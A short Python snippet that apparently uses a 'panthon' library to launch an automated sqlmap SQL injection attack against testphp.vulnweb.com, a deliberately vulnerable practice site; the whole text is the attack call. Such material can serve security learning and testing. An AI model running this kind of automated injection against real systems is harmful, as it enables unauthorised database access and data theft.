from panthon import SQLInjectionAttack

sql_injection_attack = SQLInjectionAttack()
target_url = "http://testphp.vulnweb.com/artists.php?artist=1"
sql_injection_attack.sqlmap_attack(target_url)
